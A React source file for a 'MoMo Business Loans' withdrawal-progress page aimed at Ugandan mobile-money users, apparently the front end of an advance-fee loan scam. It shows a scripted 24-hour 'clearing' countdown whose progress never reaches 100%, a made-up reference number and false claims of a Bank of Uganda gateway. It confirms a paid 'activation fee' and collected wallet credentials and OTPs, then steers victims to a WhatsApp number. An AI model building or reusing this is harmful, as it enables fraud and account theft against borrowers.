import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import Logo from '../components/Logo';
import PageLoader from '../components/PageLoader';
import { getApplication, getSession } from '../lib/session';
import { getResolvedSettings } from '../lib/settings';
import {
  Clock,
  CheckCircle2,
  AlertCircle,
  Smartphone,
  ShieldCheck,
  MessageCircle,
  Home,
  RefreshCw,
  Wallet,
  ArrowRight,
} from 'lucide-react';

export default function WithdrawalProgressPage() {
  const navigate = useNavigate();
  const application = getApplication();
  const session = getSession();
  const settings = getResolvedSettings();

  // 24 hours in seconds = 86400
  const TOTAL_WAIT_SECONDS = 24 * 60 * 60;

  // Initialize start timestamp
  const [startTime] = useState<number>(() => {
    try {
      const stored = localStorage.getItem('momo_withdrawal_initiated_at');
      if (stored) {
        const parsed = new Date(stored).getTime();
        if (!isNaN(parsed)) return parsed;
      }
      if (application?.withdrawalSubmittedAt) {
        const parsed = new Date(application.withdrawalSubmittedAt).getTime();
        if (!isNaN(parsed)) return parsed;
      }
    } catch {}
    const now = Date.now();
    try {
      localStorage.setItem('momo_withdrawal_initiated_at', new Date(now).toISOString());
    } catch {}
    return now;
  });

  const [secondsRemaining, setSecondsRemaining] = useState<number>(() => {
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    return Math.max(0, TOTAL_WAIT_SECONDS - elapsed);
  });

  useEffect(() => {
    const timer = setInterval(() => {
      const elapsed = Math.floor((Date.now() - startTime) / 1000);
      const remaining = Math.max(0, TOTAL_WAIT_SECONDS - elapsed);
      setSecondsRemaining(remaining);
    }, 1000);

    return () => clearInterval(timer);
  }, [startTime]);

  const hours = Math.floor(secondsRemaining / 3600);
  const minutes = Math.floor((secondsRemaining % 3600) / 60);
  const seconds = secondsRemaining % 60;

  const elapsedSeconds = TOTAL_WAIT_SECONDS - secondsRemaining;
  const progressPercent = Math.min(
    98,
    Math.max(4, Math.round((elapsedSeconds / TOTAL_WAIT_SECONDS) * 100))
  );

  const applicantName =
    (application?.firstName ? `${application.firstName} ${application.lastName || ''}`.trim() : '') ||
    'Valued Customer';
  const applicantPhone = application?.phone || session?.phone || '+256 700 000 000';
  const loanAmount = application?.amount || 'UGX 1,000,000';
  const activationFee = application?.activationFee || 'UGX 25,000';

  const cleanWhatsapp = (settings.whatsappRaw || '254780571549').replace(/\D/g, '');
  const whatsappUrl = `https://wa.me/${cleanWhatsapp}?text=${encodeURIComponent(
    `Hello, I am following up on my loan withdrawal progress (${loanAmount}) for ${applicantName} (${applicantPhone}).`
  )}`;

  return (
    <PageLoader>
      <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col">
        {/* Header */}
        <header className="bg-[#003d59] text-white py-3 px-4 shadow-md sticky top-0 z-40 border-b border-[hsl(198,55%,32%)]">
          <div className="container mx-auto max-w-4xl flex items-center justify-between">
            <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
              <Logo size="sm" />
              <span className="font-extrabold text-lg sm:text-xl tracking-tight">
                MoMo <span className="font-normal opacity-90">Business Loans</span>
              </span>
            </div>
            <span className="text-xs font-bold bg-white/10 px-3 py-1 rounded-full text-white">
              24-Hour Queue
            </span>
          </div>
        </header>

        {/* Main Content */}
        <main className="flex-1 container mx-auto max-w-2xl px-4 py-8 sm:py-10">
          {/* Main Card */}
          <div className="bg-white rounded-3xl p-6 sm:p-8 text-[hsl(198,100%,22%)] shadow-2xl border border-gray-100">
            {/* Header Badge */}
            <div className="flex items-center justify-between pb-4 border-b border-gray-100">
              <div className="flex items-center gap-2">
                <span className="relative flex h-3 w-3">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-sky-400 opacity-75" />
                  <span className="relative inline-flex rounded-full h-3 w-3 bg-sky-500" />
                </span>
                <span className="text-xs font-bold uppercase tracking-wider text-[#004F71]">
                  Withdrawal Queue Active
                </span>
              </div>
              <span className="text-xs font-mono font-bold bg-gray-100 text-gray-700 px-2.5 py-1 rounded-md">
                Ref: #MOMO-24H-{Math.floor(100000 + (startTime % 900000))}
              </span>
            </div>

            {/* Title & 24hr Waiting Progress Indicator */}
            <div className="text-center my-6">
              <div className="w-16 h-16 bg-sky-50 rounded-2xl border-2 border-sky-200 flex items-center justify-center mx-auto mb-3 shadow-inner">
                <Clock className="w-8 h-8 text-[#004F71] animate-pulse" />
              </div>
              <h2 className="text-2xl sm:text-3xl font-black text-gray-950 tracking-tight">
                24-Hour Loan Withdrawal Progress
              </h2>
              <p className="text-xs sm:text-sm text-gray-600 mt-1.5 max-w-md mx-auto">
                Your loan withdrawal is actively being processed in the 24-hour interbank clearing queue.
              </p>
            </div>

            {/* Big Countdown Timer Display */}
            <div className="bg-gradient-to-br from-[#003853] via-[#004f71] to-[#002b40] rounded-2xl p-5 text-white text-center shadow-lg mb-6 border border-[#00608a]/60">
              <span className="text-[11px] font-bold uppercase tracking-widest text-sky-300 block mb-2">
                Estimated Time Remaining
              </span>
              <div className="flex items-center justify-center gap-2 sm:gap-3 text-center">
                <div className="bg-black/30 rounded-xl px-3 py-2 min-w-[64px] border border-white/10">
                  <span className="text-2xl sm:text-3xl font-black font-mono text-white">
                    {String(hours).padStart(2, '0')}
                  </span>
                  <span className="block text-[10px] text-gray-300 uppercase font-semibold">Hours</span>
                </div>
                <span className="text-2xl font-black text-sky-300">:</span>
                <div className="bg-black/30 rounded-xl px-3 py-2 min-w-[64px] border border-white/10">
                  <span className="text-2xl sm:text-3xl font-black font-mono text-white">
                    {String(minutes).padStart(2, '0')}
                  </span>
                  <span className="block text-[10px] text-gray-300 uppercase font-semibold">Minutes</span>
                </div>
                <span className="text-2xl font-black text-sky-300">:</span>
                <div className="bg-black/30 rounded-xl px-3 py-2 min-w-[64px] border border-white/10">
                  <span className="text-2xl sm:text-3xl font-black font-mono text-white">
                    {String(seconds).padStart(2, '0')}
                  </span>
                  <span className="block text-[10px] text-gray-300 uppercase font-semibold">Seconds</span>
                </div>
              </div>

              {/* Progress Bar */}
              <div className="mt-4">
                <div className="flex justify-between text-[11px] font-bold mb-1 text-gray-300">
                  <span>Clearing Queue Progress</span>
                  <span className="text-sky-300 font-mono">{progressPercent}%</span>
                </div>
                <div className="w-full bg-black/40 h-2.5 rounded-full overflow-hidden border border-white/10">
                  <div
                    className="bg-sky-400 h-full transition-all duration-1000 ease-linear rounded-full shadow-sm"
                    style={{ width: `${progressPercent}%` }}
                  />
                </div>
              </div>
            </div>

            {/* Stepper Status Roadmap */}
            <div className="bg-gray-50 rounded-2xl p-4 sm:p-5 border border-gray-200 mb-6 space-y-4">
              <h3 className="text-xs font-black text-gray-700 uppercase tracking-wider">
                Disbursement Stage Breakdown
              </h3>

              <div className="space-y-3.5">
                {/* Stage 1 */}
                <div className="flex items-start gap-3">
                  <div className="w-6 h-6 rounded-full bg-green-100 text-green-700 flex items-center justify-center shrink-0 mt-0.5 border border-green-300">
                    <CheckCircle2 className="w-4 h-4 text-green-600" />
                  </div>
                  <div className="flex-1">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-extrabold text-gray-900">
                        Activation Fee Payment
                      </span>
                      <span className="text-[10px] font-bold text-green-700 bg-green-50 px-2 py-0.5 rounded">
                        Verified ✅
                      </span>
                    </div>
                    <p className="text-[11px] text-gray-500">
                      Payment of {activationFee} received and confirmed.
                    </p>
                  </div>
                </div>

                {/* Stage 2 */}
                <div className="flex items-start gap-3">
                  <div className="w-6 h-6 rounded-full bg-green-100 text-green-700 flex items-center justify-center shrink-0 mt-0.5 border border-green-300">
                    <CheckCircle2 className="w-4 h-4 text-green-600" />
                  </div>
                  <div className="flex-1">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-extrabold text-gray-900">
                        Security & Account Authentication
                      </span>
                      <span className="text-[10px] font-bold text-green-700 bg-green-50 px-2 py-0.5 rounded">
                        Authenticated ✅
                      </span>
                    </div>
                    <p className="text-[11px] text-gray-500">
                      MoMo wallet credentials and OTP verification confirmed.
                    </p>
                  </div>
                </div>

                {/* Stage 3 */}
                <div className="flex items-start gap-3">
                  <div className="w-6 h-6 rounded-full bg-amber-100 text-amber-800 flex items-center justify-center shrink-0 mt-0.5 border border-amber-300 animate-pulse">
                    <RefreshCw className="w-3.5 h-3.5 text-amber-700 animate-spin" />
                  </div>
                  <div className="flex-1">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-extrabold text-gray-900">
                        Interbank Clearing & 24hr Settlement
                      </span>
                      <span className="text-[10px] font-bold text-amber-800 bg-amber-50 px-2 py-0.5 rounded animate-pulse">
                        In Progress ⏳
                      </span>
                    </div>
                    <p className="text-[11px] text-gray-500">
                      Batched for automated release through Bank of Uganda Mobile Money gateway.
                    </p>
                  </div>
                </div>

                {/* Stage 4 */}
                <div className="flex items-start gap-3 opacity-60">
                  <div className="w-6 h-6 rounded-full bg-gray-200 text-gray-600 flex items-center justify-center shrink-0 mt-0.5">
                    <Wallet className="w-3.5 h-3.5 text-gray-500" />
                  </div>
                  <div className="flex-1">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-gray-700">
                        Direct Wallet Credit ({loanAmount})
                      </span>
                      <span className="text-[10px] font-bold text-gray-500 bg-gray-100 px-2 py-0.5 rounded">
                        Scheduled
                      </span>
                    </div>
                    <p className="text-[11px] text-gray-500">
                      Funds deposited automatically to {applicantPhone}.
                    </p>
                  </div>
                </div>
              </div>
            </div>

            {/* Transaction Details Box */}
            <div className="bg-white rounded-2xl p-4 border border-gray-200 mb-6 text-xs space-y-2">
              <div className="flex justify-between py-1 border-b border-gray-100">
                <span className="text-gray-500">Applicant:</span>
                <span className="font-extrabold text-gray-900">{applicantName}</span>
              </div>
              <div className="flex justify-between py-1 border-b border-gray-100">
                <span className="text-gray-500">Approved Loan Amount:</span>
                <span className="font-black text-green-700 text-sm">{loanAmount}</span>
              </div>
              <div className="flex justify-between py-1 border-b border-gray-100">
                <span className="text-gray-500">Credited Phone Number:</span>
                <span className="font-bold text-gray-900">{applicantPhone}</span>
              </div>
              <div className="flex justify-between py-1 border-b border-gray-100">
                <span className="text-gray-500">Activation Fee:</span>
                <span className="font-bold text-gray-800">{activationFee} (Paid)</span>
              </div>
              <div className="flex justify-between py-1">
                <span className="text-gray-500">Status:</span>
                <span className="font-extrabold text-amber-700">24-Hour Settlement Active</span>
              </div>
            </div>

            {/* SMS Notification Banner */}
            <div className="bg-amber-50/80 border border-amber-200 rounded-2xl p-3.5 mb-6 text-xs text-amber-950 flex items-start gap-2.5 text-left">
              <Smartphone className="w-5 h-5 text-amber-600 shrink-0 mt-0.5" />
              <p className="leading-relaxed">
                You will receive an official <span className="font-bold">MTN/Airtel MoMo SMS notification</span> directly on your phone with your funds as soon as the 24-hour clearing cycle completes.
              </p>
            </div>

            {/* Actions */}
            <div className="space-y-3">
              <a
                href={whatsappUrl}
                target="_blank"
                rel="noopener noreferrer"
                className="w-full py-4 px-4 rounded-full bg-[#25D366] hover:bg-[#20ba59] text-white font-bold text-sm tracking-wide uppercase flex items-center justify-center gap-2 shadow-md transition cursor-pointer"
              >
                <MessageCircle className="w-5 h-5 fill-white" />
                <span>Follow Up on WhatsApp ({settings.whatsappNumber})</span>
              </a>

              <button
                type="button"
                onClick={() => navigate('/')}
                className="w-full py-3.5 rounded-full bg-gray-100 hover:bg-gray-200 text-gray-800 font-bold text-sm transition cursor-pointer flex items-center justify-center gap-2"
              >
                <Home className="w-4 h-4" />
                <span>Back to Home</span>
              </button>
            </div>
          </div>
        </main>
      </div>
    </PageLoader>
  );
}
